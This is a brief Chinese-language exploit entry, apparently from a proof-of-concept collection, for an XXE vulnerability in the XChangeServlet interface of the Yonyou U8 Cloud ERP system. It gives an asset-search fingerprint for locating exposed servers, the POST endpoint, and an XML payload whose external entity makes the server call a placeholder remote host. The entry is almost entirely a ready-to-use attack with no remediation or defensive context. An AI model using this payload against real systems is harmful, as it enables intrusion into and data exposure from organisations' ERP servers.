# 用友U8Cloud系统XChangeServlet接口存在XXE漏洞

用友 ｜ XXE ｜ —
- **指纹**：`app=”用友-U8-Cloud”`
- **请求**：`POST /servlet/XChangeServlet HTTP/1.1`

**Payload**
```
<!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://xxx.xxx.xxx"> %remote;]>'
```